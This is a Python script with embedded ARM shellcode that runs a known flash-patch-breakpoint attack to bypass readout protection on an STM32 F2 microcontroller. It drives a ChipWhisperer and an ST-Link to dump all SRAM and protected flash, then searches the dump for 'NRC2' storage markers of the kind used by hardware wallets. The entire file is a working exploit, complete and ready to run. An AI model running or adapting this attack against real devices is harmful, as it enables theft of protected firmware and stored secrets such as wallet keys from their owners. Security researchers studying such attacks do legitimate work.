#!/usr/bin/env python
"""fpb_fulldump.py - READ-ONLY full flash + SRAM dump of an F2 @ RDP1 via the
Obermaier-H3 FPB technique (extends h3_fpb_attack.py to the whole flash in
chunks). NON-DESTRUCTIVE: only stages code into SRAM and toggles power/boot/
NRST; no flash/option writes, no erase, no glitch.

Flash @RDP1 is debugger-read-blocked, so stage2 (running in flash-boot context,
where flash is accessible) copies a window of flash into an SRAM scratch buffer;
the host reads the scratch over SWD. A param block in SRAM selects the window,
and the window is walked across the whole flash, re-arming the FPB each chunk.

SRAM is directly SWD-readable, so it is dumped first (before the shellcode is
staged) to best preserve the firmware's SRAM state.

Env: FLASH_KB (default 512), CHUNK_KB (default 64), OFF_MS (default 30).
"""
import os, sys, time, glob, fcntl, gc, subprocess, tempfile
import chipwhisperer as cw
from swd.stlink import Stlink
from swd.cortexm import CortexM

S1_BASE = 0x20000000
REMAP   = 0x20000100
PARAMS  = 0x20001000            # [0]=src flash addr, [1]=nwords
S2_DONE = 0x20001010; S2_DONE_VAL = 0xD09ED09E
S1_DONE = 0x20001020; S1_DONE_VAL = 0x51A1E001
S2_BASE = 0x20001800
SCRATCH = 0x20002000
SP_TOP  = 0x20020000            # top of 128 KB SRAM
FLASH_BASE = 0x08000000
OFF_MS  = int(os.environ.get('OFF_MS', '30'))
HERE = os.path.dirname(os.path.abspath(__file__))

STAGE1 = r'''
    .syntax unified
    .cpu cortex-m3
    .thumb
    .global _start
_start:
    .word 0x20020000            @ vector[0] SP (SRAM-boot of stage1)
    .word s1+1                  @ vector[1] reset -> stage1
s1:
    ldr r0, =0xE0002004         @ FP_REMAP
    movs r1, #0x100             @ remap table -> 0x20000100 (proven magic)
    str r1, [r0]
    ldr r0, =0x20000100
    ldr r1, =0x20020000
    str r1, [r0]                @ remap[0] (addr 0x0) -> SP
    ldr r1, =0x20001801         @ remap[1] (addr 0x4) -> stage2 | thumb
    str r1, [r0, #4]
    ldr r0, =0xE0002008         @ FP_COMP0: addr 0x0, remap, enable
    movs r1, #1
    str r1, [r0]
    movs r1, #5                 @ FP_COMP1: addr 0x4, remap, enable
    str r1, [r0, #4]
    ldr r0, =0xE0002000         @ FP_CTRL
    movs r1, #3                 @ KEY | ENABLE
    str r1, [r0]
    ldr r0, =0x20001020         @ stage1-done
    ldr r1, =0x51A1E001
    str r1, [r0]
spin1:
    b spin1
    .ltorg
'''

STAGE2 = r'''
    .syntax unified
    .cpu cortex-m3
    .thumb
    .global _start
_start:
    ldr r0, =0x20020000
    mov sp, r0
    ldr r4, =0x20001000         @ PARAMS
    ldr r0, [r4]                @ src flash addr
    ldr r2, [r4, #4]            @ nwords
    ldr r1, =0x20002000         @ scratch
cp:
    ldr r3, [r0]                @ flash read (accessible in flash-boot)
    str r3, [r1]
    adds r0, r0, #4
    adds r1, r1, #4
    subs r2, r2, #1
    bne cp
    ldr r0, =0x20001010         @ stage2-done
    ldr r3, =0xD09ED09E
    str r3, [r0]
sp2:
    b sp2
    .ltorg
'''


def build(src, link):
    d = tempfile.mkdtemp(prefix='fpbfull_')
    s, o, e, b = (os.path.join(d, f) for f in ('a.s', 'a.o', 'a.elf', 'a.bin'))
    open(s, 'w').write(src)
    subprocess.run(['arm-none-eabi-as', '-mcpu=cortex-m3', '-mthumb', '-o', o, s], check=True)
    subprocess.run(['arm-none-eabi-ld', f'-Ttext={hex(link)}', '-e', '_start', '-o', e, o], check=True)
    subprocess.run(['arm-none-eabi-objcopy', '-O', 'binary', e, b], check=True)
    return open(b, 'rb').read()


def usbreset():
    RST = (ord('U') << 8) | 20
    for d in glob.glob('/sys/bus/usb/devices/*'):
        try:
            if open(d + '/idVendor').read().strip() == '0483' and open(d + '/idProduct').read().strip() == '3748':
                bb = int(open(d + '/busnum').read()); n = int(open(d + '/devnum').read())
                fd = os.open(f'/dev/bus/usb/{bb:03d}/{n:03d}', os.O_WRONLY); fcntl.ioctl(fd, RST, 0); os.close(fd); return
        except OSError:
            continue


def connect():
    for _ in range(6):
        try:
            return Stlink(swd_frequency=1800000)
        except Exception:
            usbreset(); time.sleep(0.6)
    raise SystemExit('swd down')


def wr_blob(st, base, blob):
    import struct
    for i in range(0, len(blob), 4):
        st.set_mem32(base + i, struct.unpack('<I', blob[i:i + 4].ljust(4, b'\0'))[0])


def rd_block(st, addr, nbytes):
    """Read nbytes from memory over SWD in <=1024 B, 4-aligned chunks."""
    out = bytearray()
    off = 0
    while off < nbytes:
        c = min(1024, nbytes - off)
        out += bytes(st.read_mem32(addr + off, c))
        off += c
    return bytes(out)


def drop(st):
    try:
        st.__del__()
    except Exception:
        pass
    del st
    gc.collect()


def main():
    flash_kb = int(os.environ.get('FLASH_KB', '512'))
    chunk_kb = int(os.environ.get('CHUNK_KB', '64'))
    total_words = flash_kb * 1024 // 4
    chunk_words = chunk_kb * 1024 // 4
    s1 = build(STAGE1, S1_BASE); s2 = build(STAGE2, S2_BASE)
    print(f'[+] stage1={len(s1)}B stage2={len(s2)}B  flash={flash_kb}KB chunk={chunk_kb}KB off={OFF_MS}ms')

    s = cw.scope(); s.clock.clkgen_freq = 16e6
    s.io.glitch_hp = False; s.io.glitch_lp = False
    s.io.tio1 = False; s.io.tio2 = False; s.io.tio3 = 'high_z'; s.io.tio4 = 'high_z'
    s.io.target_pwr = False; time.sleep(0.5); s.io.target_pwr = True; time.sleep(1.0)

    st = connect(); cm = CortexM(st)
    try:
        cm.halt()
    except Exception:
        pass
    idc = st.get_idcode(); rdp = (st.get_mem32(0x40023C14) >> 8) & 0xff
    print(f'[+] IDCODE=0x{idc:08x} RDP=0x{rdp:02x}')

    # --- SRAM dump first (direct SWD), before staging shellcode ---
    sram = rd_block(st, 0x20000000, 0x20000)
    os.makedirs(os.path.join(HERE, 'dumps'), exist_ok=True)
    sp = os.path.join(HERE, 'dumps', 'sram_fulldump.bin'); open(sp, 'wb').write(sram)
    nz = sum(1 for b in sram if b != 0)
    print(f'[+] SRAM 128KB dumped -> {sp}  (non-zero bytes: {nz})')

    # --- stage shellcode (core still halted; firmware never runs to clear SRAM) ---
    wr_blob(st, S1_BASE, s1); wr_blob(st, S2_BASE, s2)
    st.set_mem32(S1_DONE, 0); st.set_mem32(S2_DONE, 0)
    drop(st)

    flash = bytearray()
    src = FLASH_BASE
    remaining = total_words
    idx = 0
    while remaining > 0:
        n = min(chunk_words, remaining)
        # set PARAMS for this window
        st = connect()
        st.set_mem32(PARAMS, src); st.set_mem32(PARAMS + 4, n)
        st.set_mem32(S1_DONE, 0); st.set_mem32(S2_DONE, 0)
        drop(st)
        # SRAM-boot re-arms FPB (stage1 runs); caps preserve SRAM across the gap
        s.io.tio1 = True; s.io.tio2 = True
        s.io.target_pwr = False; time.sleep(OFF_MS / 1000.0); s.io.target_pwr = True
        time.sleep(0.25)
        # flash-boot + NRST -> FPB redirect -> stage2 copies the window
        s.io.tio1 = False; s.io.tio2 = False; time.sleep(0.02)
        s.io.tio4 = 'gpio_low'; time.sleep(0.05); s.io.tio4 = 'high_z'; time.sleep(0.35)
        # read back
        st = connect()
        d1 = st.get_mem32(S1_DONE); d2 = st.get_mem32(S2_DONE)
        data = rd_block(st, SCRATCH, n * 4) if d2 == S2_DONE_VAL else None
        drop(st)
        if data is None:
            print(f'[!] chunk {idx} @0x{src:08x} FAILED (s1=0x{d1:08x} s2=0x{d2:08x}) - stopping here')
            break
        flash += data
        nonff = sum(1 for b in data if b != 0xFF)
        print(f'    chunk {idx} @0x{src:08x} {n*4}B ok  non-FF={nonff}')
        src += n * 4; remaining -= n; idx += 1

    fp = os.path.join(HERE, 'dumps', 'flash_fulldump.bin'); open(fp, 'wb').write(flash)
    print(f'[+] FLASH dumped: {len(flash)}B ({len(flash)//1024}KB) -> {fp}')

    s.io.tio1 = False; s.io.tio2 = 'high_z'; s.io.tio4 = 'high_z'
    s.io.target_pwr = False; s.dis()

    # --- scan flash for NORCOW storage magic ---
    mg = b'NRC2'
    hits = [FLASH_BASE + i for i in range(0, len(flash) - 4) if flash[i:i + 4] == mg]
    print(f'[+] NORCOW "NRC2" magic found at: {[hex(h) for h in hits] if hits else "NONE"}')
    # also report per-16KB-sector fill
    print('[+] flash sector fill (non-FF bytes per 16KB):')
    for off in range(0, len(flash), 0x4000):
        seg = flash[off:off + 0x4000]
        nf = sum(1 for b in seg if b != 0xFF)
        if nf:
            print(f'      0x{FLASH_BASE+off:08x}: {nf}/{len(seg)} non-FF')


if __name__ == '__main__':
    main()
